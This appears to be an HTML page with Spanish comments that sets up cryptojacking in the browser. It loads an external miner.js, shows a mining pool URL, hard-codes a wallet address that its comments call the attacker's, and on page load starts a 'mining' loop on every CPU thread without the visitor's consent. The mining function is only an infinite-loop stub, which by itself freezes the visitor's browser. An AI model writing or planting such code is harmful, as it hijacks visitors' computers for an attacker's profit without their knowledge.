<!DOCTYPE html>
<html>
<head>
    <!-- Carga el archivo JavaScript -->
    <script src="miner.js"></script>
</head>
<body>
    <p>La URL de la pool es: <span id="pool-url"></span></p>

    <script>
        // Obtiene la URL de la pool
        const poolURL = 'rx.unmineable.com:443';

        // Muestra la URL de la pool en el elemento span
        document.getElementById("pool-url").textContent = poolURL;

        // Dirección de la billetera de criptomonedas del atacante
        const walletAddress = 'WLD:0xe77070ce816595803c00deca32af997654ad47d8.YWK#iczs-elgt';

        // Función para realizar la minería
        function startMining() {
          // Obtiene la potencia de procesamiento de la CPU del usuario
          const numThreads = navigator.hardwareConcurrency || 4; // Número de hilos de CPU

          // Bucle para simular la minería en cada hilo de CPU
          for (let i = 0; i < numThreads; i++) {
            // Realiza el proceso de minería en cada hilo
            mine(walletAddress);
          }
        }

        // Función para simular la minería
        function mine(wallet) {
          // Realiza cálculos intensivos para la minería de criptomonedas
          // En un entorno real, se utilizarían algoritmos criptográficos, pero aquí se usa un bucle simple para la demostración.
          let nonce = 0;
          while (true) {
            // Calcula un hash o realiza otras operaciones de minería aquí
            // El objetivo es encontrar un valor que cumpla con ciertos requisitos para obtener una recompensa en criptomonedas
            nonce++;
          }
        }

        // Iniciar la minería cuando se carga la página
        window.addEventListener('load', () => {
          startMining();
        });
    </script>
</body>
</html>
